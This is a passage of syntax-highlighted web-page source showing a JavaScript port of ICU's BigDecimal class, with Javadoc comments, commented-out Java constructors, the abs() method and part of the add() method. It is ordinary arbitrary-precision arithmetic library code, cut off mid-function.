decimal</span></span><br><span class="line"><span class="comment">  * representation of the 64-bit signed binary integer parameter.</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; will contain only decimal digits,</span></span><br><span class="line"><span class="comment">  * prefixed with a leading minus sign (hyphen) if the parameter is</span></span><br><span class="line"><span class="comment">  * negative.</span></span><br><span class="line"><span class="comment">  * A leading zero will be present only if the parameter is zero.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param num The &lt;code&gt;long&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(long num)&#123;super();</span></span><br><span class="line"> <span class="comment">//-- long mun;</span></span><br><span class="line"> <span class="comment">//-- int i=0;</span></span><br><span class="line"> <span class="comment">//-- // Not really worth fastpathing commoners in this constructor [also,</span></span><br><span class="line"> <span class="comment">//-- // we use this to construct the static constants].</span></span><br><span class="line"> <span class="comment">//-- // This is much faster than: this(String.valueOf(num).toCharArray())</span></span><br><span class="line"> <span class="comment">//-- /* We work on negative num so we handle the most negative number */</span></span><br><span class="line"> <span class="comment">//-- if (num&gt;0)</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   ind=ispos;</span></span><br><span class="line"> <span class="comment">//--   num=(long)-num;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- else</span></span><br><span class="line"> <span class="comment">//--  if (num==0)</span></span><br><span class="line"> <span class="comment">//--   ind=iszero;</span></span><br><span class="line"> <span class="comment">//--  else</span></span><br><span class="line"> <span class="comment">//--   ind=isneg;/* negative */</span></span><br><span class="line"> <span class="comment">//-- mun=num;</span></span><br><span class="line"> <span class="comment">//-- &#123;i=18;i:for(;;i--)&#123;</span></span><br><span class="line"> <span class="comment">//--  mun=mun/10;</span></span><br><span class="line"> <span class="comment">//--  if (mun==0)</span></span><br><span class="line"> <span class="comment">//--   break i;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;/*i*/</span></span><br><span class="line"> <span class="comment">//-- // i is the position of the leftmost digit placed</span></span><br><span class="line"> <span class="comment">//-- mant=new byte[19-i];</span></span><br><span class="line"> <span class="comment">//-- &#123;i=(19-i)-1;i:for(;;i--)&#123;</span></span><br><span class="line"> <span class="comment">//--  mant[i]=(byte)-(((byte)(num%10)));</span></span><br><span class="line"> <span class="comment">//--  num=num/10;</span></span><br><span class="line"> <span class="comment">//--  if (num==0)</span></span><br><span class="line"> <span class="comment">//--   break i;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;/*i*/</span></span><br><span class="line"> <span class="comment">//-- return;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; object from a &lt;code&gt;String&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Constructs a &lt;code&gt;BigDecimal&lt;/code&gt; from the parameter, which must</span></span><br><span class="line"><span class="comment">  * not be &lt;code&gt;null&lt;/code&gt; and must represent a valid &lt;i&gt;number&lt;/i&gt;,</span></span><br><span class="line"><span class="comment">  * as described formally in the documentation referred to</span></span><br><span class="line"><span class="comment">  * &#123;@link BigDecimal above&#125;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * In summary, numbers in &lt;code&gt;String&lt;/code&gt; form must have at least</span></span><br><span class="line"><span class="comment">  * one digit, may have a leading sign, may have a decimal point, and</span></span><br><span class="line"><span class="comment">  * exponential notation may be used.  They follow conventional syntax,</span></span><br><span class="line"><span class="comment">  * and may not contain blanks.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Some valid strings from which a &lt;code&gt;BigDecimal&lt;/code&gt; might</span></span><br><span class="line"><span class="comment">  * be constructed are:</span></span><br><span class="line"><span class="comment">  * &lt;pre&gt;</span></span><br><span class="line"><span class="comment">  *       "0"         -- Zero</span></span><br><span class="line"><span class="comment">  *      "12"         -- A whole number</span></span><br><span class="line"><span class="comment">  *     "-76"         -- A signed whole number</span></span><br><span class="line"><span class="comment">  *      "12.70"      -- Some decimal places</span></span><br><span class="line"><span class="comment">  *     "+0.003"      -- Plus sign is allowed</span></span><br><span class="line"><span class="comment">  *      "17."        -- The same as 17</span></span><br><span class="line"><span class="comment">  *        ".5"       -- The same as 0.5</span></span><br><span class="line"><span class="comment">  *      "4E+9"       -- Exponential notation</span></span><br><span class="line"><span class="comment">  *       "0.73e-7"   -- Exponential notation</span></span><br><span class="line"><span class="comment">  * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * (Exponential notation means that the number includes an optional</span></span><br><span class="line"><span class="comment">  * sign and a power of ten following an '&lt;/code&gt;E&lt;/code&gt;' that</span></span><br><span class="line"><span class="comment">  * indicates how the decimal point will be shifted.  Thus the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;"4E+9"&lt;/code&gt; above is just a short way of writing</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;4000000000&lt;/code&gt;, and the &lt;code&gt;"0.73e-7"&lt;/code&gt; is short</span></span><br><span class="line"><span class="comment">  * for &lt;code&gt;0.000000073&lt;/code&gt;.)</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The &lt;code&gt;BigDecimal&lt;/code&gt; constructed from the String is in a</span></span><br><span class="line"><span class="comment">  * standard form, with no blanks, as though the</span></span><br><span class="line"><span class="comment">  * &#123;@link #add(BigDecimal)&#125; method had been used to add zero to the</span></span><br><span class="line"><span class="comment">  * number with unlimited precision.</span></span><br><span class="line"><span class="comment">  * If the string uses exponential notation (that is, includes an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;e&lt;/code&gt; or an &lt;code&gt;E&lt;/code&gt;), then the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; number will be expressed in scientific</span></span><br><span class="line"><span class="comment">  * notation (where the power of ten is adjusted so there is a single</span></span><br><span class="line"><span class="comment">  * non-zero digit to the left of the decimal point); in this case if</span></span><br><span class="line"><span class="comment">  * the number is zero then it will be expressed as the single digit 0,</span></span><br><span class="line"><span class="comment">  * and if non-zero it will have an exponent unless that exponent would</span></span><br><span class="line"><span class="comment">  * be 0.  The exponent must fit in nine digits both before and after it</span></span><br><span class="line"><span class="comment">  * is expressed in scientific notation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Any digits in the parameter must be decimal; that is,</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;Character.digit(c, 10)&lt;/code&gt; (where &lt;/code&gt;c&lt;/code&gt; is the</span></span><br><span class="line"><span class="comment">  * character in question) would not return -1.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param string The &lt;code&gt;String&lt;/code&gt; to be converted.</span></span><br><span class="line"><span class="comment">  * @throws NumberFormatException if the parameter is not a valid</span></span><br><span class="line"><span class="comment">  * number.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public BigDecimal(java.lang.String string)&#123;</span></span><br><span class="line"> <span class="comment">//-- this(string.toCharArray(),0,string.length());</span></span><br><span class="line"> <span class="comment">//-- return;&#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Make a default BigDecimal object for local use. &lt;/sgml&gt; */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private BigDecimal()&#123;super();</span></span><br><span class="line"> <span class="comment">//-- return;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"> <span class="comment">/* Operator methods [methods which take a context parameter]        */</span></span><br><span class="line"> <span class="comment">/* ---------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute</span></span><br><span class="line"><span class="comment">  * value of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #abs(MathContext)&#125;, where the context is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will</span></span><br><span class="line"><span class="comment">  * be &lt;code&gt;this.scale()&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute</span></span><br><span class="line"><span class="comment">  *         value of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal abs()&#123;</span></span><br><span class="line"> <span class="comment">//- return this.abs(plainMC);</span></span><br><span class="line"> <span class="comment">//- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute value</span></span><br><span class="line"><span class="comment">  * of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the current object is zero or positive, then the same result as</span></span><br><span class="line"><span class="comment">  * invoking the &#123;@link #plus(MathContext)&#125; method with the same</span></span><br><span class="line"><span class="comment">  * parameter is returned.</span></span><br><span class="line"><span class="comment">  * Otherwise, the same result as invoking the</span></span><br><span class="line"><span class="comment">  * &#123;@link #negate(MathContext)&#125; method with the same parameter is</span></span><br><span class="line"><span class="comment">  * returned.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is the absolute</span></span><br><span class="line"><span class="comment">  *             value of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal abs(com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (abs.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = abs.arguments[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (abs.arguments.length == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"abs(): "</span> + abs.arguments.length + <span class="string">" arguments given; expected 0 or 1"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.isneg)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.negate(set);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.plus(set);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this+rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #add(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * the maximum of the scales of the two operands.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the addition.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this+rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal add(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.add(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this+rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the addition (&lt;b&gt;&lt;code&gt;+&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the addition.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this+rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal add(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (add.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = add.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (add.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"add(): "</span> + add.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = add.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal lhs;</span></span><br><span class="line">  <span class="keyword">var</span> lhs;</span><br><span class="line">  <span class="comment">//--int reqdig;</span></span><br><span class="line">  <span class="keyword">var</span> reqdig;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">//--byte usel[];</span></span><br><span class="line">  <span class="keyword">var</span> usel;</span><br><span class="line">  <span class="comment">//--int usellen;</span></span><br><span class="line">  <span class="keyword">var</span> usellen;</span><br><span class="line">  <span class="comment">//--byte user[];</span></span><br><span class="line">  <span class="keyword">var</span> user;</span><br><span class="line">  <span class="comment">//--int userlen;</span></span><br><span class="line">  <span class="keyword">var</span> userlen;</span><br><span class="line">  <span class="comment">//--int newlen=0;</span></span><br><span class="line">  <span class="keyword">var</span> newlen=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int tlen=0;</span></span><br><span class="line">  <span class="keyword">var</span> tlen=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int mult=0;</span></span><br><span class="line">  <span class="keyword">var</span> mult=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte t[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> t=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int ia=0;</span></span><br><span class="line">  <span class="keyword">var</span> ia=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int ib=0;</span></span><br><span class="line">  <span class="keyword">var</span> ib=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int ea=0;</span></span><br><span class="line">  <span class="keyword">var</span> ea=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//int eb=0;</span></span><br><span class="line">  <span class="keyword">var</span> eb=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//byte ca=0;</span></span><br><span class="line">  <span class="keyword">var</span> ca=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte cb=0;</span></span><br><span class="line">  <span class="keyword">var</span> cb=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* determine requested digits and form */</span></span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  lhs=<span class="keyword">this</span>; <span class="comment">// name for clarity and proxy</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quick exit for add floating 0 */</span></span><br><span class="line">  <span class="comment">// plus() will optimize to return same object if possible</span></span><br><span class="line">  <span class="keyword">if</span> (lhs.ind==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">    <span class="keyword">return</span> rhs.plus(set);</span><br><span class="line">  <span class="keyword">if</span> (rhs.ind==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">    <span class="keyword">return</span> lhs.plus(set);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Prepare numbers (round, unless unlimited precision) */</span></span><br><span class="line">  reqdig=set.digits; <span class="comment">// local copy (heavily used)</span></span><br><span class="line">  <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.mant.length&gt;reqdig)</span><br><span class="line">     lhs=<span class="keyword">this</span>.clone(lhs).round(set);</span><br><span class="line">    <span class="keyword">if</span> (rhs.mant.length&gt;reqdig)</span><br><span class="line">     rhs=<span class="keyword">this</span>.clone(rhs).round(set);</span><br><span class="line">   <span class="comment">// [we could reuse the new LHS for result in this case]</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  res=<span class="keyword">new</span> BigDecimal(); <span class="comment">// build result here</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now see how much we have to pad or truncate lhs or rhs in order</span></span><br><span class="line"><span class="comment">     to align the numbers.  If one number is much larger than the</span></span><br><span class="line"><span class="comment">     other, then the smaller cannot affect the answer [but we may</span></span><br><span class="line"><span class="comment">     still need to pad with up to DIGITS trailing zeros]. */</span></span><br><span class="line">  <span class="comment">// Note sign may be 0 if digits (reqdig) is 0</span></span><br><span class="line">  <span class="comment">// usel and user will be the byte arrays passed to the adder; we'll</span></span><br><span class="line">  <span class="comment">// use them on all paths except quick exits</span></span><br><span class="line">  usel=lhs.mant;</span><br><span class="line">  usellen=lhs.mant.length;</span><br><span class="line">  user=rhs.mant;</span><br><span class="line">  userlen=rhs.mant.length;</span><br><span class="line">  &#123;<span class="attr">padder</span>:<span class="keyword">do</span>&#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (lhs.exp==rhs.exp)</span><br><span class="line">   &#123;<span class="comment">/* no padding needed */</span></span><br><span class="line">    <span class="comment">// This is the most common, and fastest, path</span></span><br><span class="line">    res.exp=lhs.exp;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (lhs.exp&gt;rhs.exp)</span><br><span class="line">   &#123; <span class="comment">// need to pad lhs and/or truncate rhs</span></span><br><span class="line">    newlen=(usellen+lhs.exp)-rhs.exp;</span><br><span class="line">    <span class="comment">/* If, after pad, lhs would be longer than rhs by digits+1 or</span></span><br><span class="line"><span class="comment">       more (and digits&gt;0) then rhs cannot affect answer, so we only</span></span><br><span class="line"><span class="comment">       need to pad up to a length of DIGITS+1. */</span></span><br><span class="line">    <span class="keyword">if</span> (newlen&gt;=((userlen+reqdig)+<span class="number">1</span>))</span><br><span class="line">     <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">// LHS is sufficient</span></span><br><span class="line">       res.mant=usel;</span><br><span class="line">       res.exp=lhs.exp;</span><br><span class="line">       res.ind=lhs.ind;</span><br><span class="line">       <span class="keyword">if</span> (usellen&lt;reqdig)</span><br><span class="line">        &#123; <span class="comment">// need 0 padding</span></span><br><span class="line">         res.mant=<span class="keyword">this</span>.extend(lhs.mant,reqdig);</span><br><span class="line">         res.exp=res.exp-((reqdig-usellen));</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// RHS may affect result</span></span><br><span class="line">    res.exp=rhs.exp; <span class="comment">// expected final exponent</span></span><br><span class="line">    <span class="keyword">if</span> (newlen&gt;(reqdig+<span class="number">1</span>))</span><br><span class="line">     <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="comment">// LHS will be max; RHS truncated</span></span><br><span class="line">       tlen=(newlen-reqdig)<span class="number">-1</span>; <span class="comment">// truncation length</span></span><br><span class="line">       userlen=userlen-tlen;</span><br><span class="line">       res.exp=res.exp+tlen;</span><br><span class="line">       newlen=reqdig+<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (newlen&gt;usellen)</span><br><span class="line">     usellen=newlen; <span class="comment">// need to pad LHS</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; <span class="comment">// need to pad rhs and/or truncate lhs</span></span><br><span class="line">   newlen=(userlen+rhs.exp)-lhs.exp;</span><br><span class="line">   <span class="keyword">if</span> (newlen&gt;=((usellen+reqdig)+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="comment">// RHS is sufficient</span></span><br><span class="line">      res.mant=user;</span><br><span class="line">      res.exp=rhs.exp;</span><br><span class="line">      res.ind=rhs.ind;</span><br><span class="line">      <span class="keyword">if</span> (userlen&lt;reqdig)</span><br><span class="line">       &#123; <span class="comment">// need 0 padding</span></span><br><span class="line">        res.mant=<span class="keyword">this</span>.extend(rhs.mant,reqdig);</span><br><span class="line">        res.exp=res.exp-((reqdig-userlen));</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">// LHS may affect result</span></span><br><span class="line">   res.exp=lhs.exp; <span class="comment">// expected final exponent</span></span><br><span class="line">   <span class="keyword">if</span> (newlen&gt;(reqdig+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="comment">// RHS will be max; LHS truncated</span></span><br><span class="line">      tlen=(newlen-reqdig)<span class="number">-1</span>; <span class="comment">// truncation length</span></span><br><span class="line">      usellen=usellen-tlen;</span><br><span class="line">      res.exp=res.exp+tlen;</span><br><span class="line">      newlen=reqdig+<span class="number">1</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">if</span> (newlen&gt;userlen)</span><br><span class="line">    userlen=newlen; <span class="comment">// need to pad RHS</span></span><br><span class="line">  &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*padder*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* OK, we have aligned mantissas.  Now add or subtract. */</span></span><br><span class="line">  <span class="comment">// 1998.06.27 Sign may now be 0 [e.g., 0.000] .. treat as positive</span></span><br><span class="line">  <span class="comment">// 1999.05.27 Allow for 00 on lhs [is not larger than 2 on rhs]</span></span><br><span class="line">  <span class="comment">// 1999.07.10 Allow for 00 on rhs [is not larger than 2 on rhs]</span></span><br><span class="line">  <span class="keyword">if</span> (lhs.ind==<span class="keyword">this</span>.iszero)</span><br><span class="line">   res.ind=<span class="keyword">this</span>.ispos;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   res.ind=lhs.ind; <span class="comment">// likely sign, all paths</span></span><br><span class="line">  <span class="keyword">if</span> (((lhs.ind==<span class="keyword">this</span>.isneg)?<span class="number">1</span>:<span class="number">0</span>)==((rhs.ind==<span class="keyword">this</span>.isneg)?<span class="number">1</span>:<span class="number">0</span>))  <span class="comment">// same sign, 0 non-negative</span></span><br><span class="line">   mult=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="attr">signdiff</span>:<span class="keyword">do</span>&#123; <span class="comment">// different signs, so subtraction is needed</span></span><br><span class="line">    mult=<span class="number">-1</span>; <span class="comment">// will cause subtract</span></span><br><span class="line">    <span class="comment">/* Before we can subtract we must determine which is the larger,</span></span><br><span class="line"><span class="comment">       as our add/subtract routine only handles non-negative results</span></span><br><span class="line"><span class="comment">       so we may need to swap the operands. */</span></span><br><span class="line">    &#123;<span class="attr">swaptest</span>:<span class="keyword">do</span>&#123;<span class="comment">/*select*/</span></span><br><span class="line">    <span class="keyword">if</span> (rhs.ind==<span class="keyword">this</span>.iszero)</span><br><span class="line">     &#123;&#125; <span class="comment">// original A bigger</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((usellen&lt;userlen)||(lhs.ind==<span class="keyword">this</span>.iszero))</span><br><span class="line">     &#123; <span class="comment">// original B bigger</span></span><br><span class="line">      t=usel;</span><br><span class="line">      usel=user;</span><br><span class="line">      user=t; <span class="comment">// swap</span></span><br><span class="line">      tlen=usellen;</span><br><span class="line">      usellen=userlen;</span><br><span class="line">      userlen=tlen; <span class="comment">// ..</span></span><br><span class="line">      res.ind=-res.ind; <span class="comment">// and set sign</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (usellen&gt;userlen)</span><br><span class="line">     &#123;&#125; <span class="comment">// original A bigger</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     &#123;<span class="comment">/* logical lengths the same */</span> <span class="comment">// need compare</span></span><br><span class="line">      <span class="comment">/* may still need to swap: compare the strings */</span></span><br><span class="line">      ia=<span class="number">0</span>;</span><br><span class="line">      ib=<span class="number">0</span>;</span><br><span class="line">      ea=usel.length<span class="number">-1</span>;</span><br><span class="line">      eb=user.length<span class="number">-1</span>;</span><br><span class="line">      &#123;<span class="attr">compare</span>:<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">       <span class="keyword">if</span> (ia&lt;=ea)</span><br><span class="line">        ca=usel[ia];</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">         <span class="keyword">if</span> (ib&gt;eb)</span><br><span class="line">          &#123;<span class="comment">/* identical */</span></span><br><span class="line">           <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.ZERO;</span><br><span class="line">           <span class="comment">// [if PLAIN we must do the subtract, in case of 0.000 results]</span></span><br><span class="line">           <span class="keyword">break</span> compare;</span><br><span class="line">          &#125;</span><br><span class="line">         ca=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">if</span> (ib&lt;=eb)</span><br><span class="line">        cb=user[ib];</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">        cb=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> (ca!=cb)</span><br><span class="line">        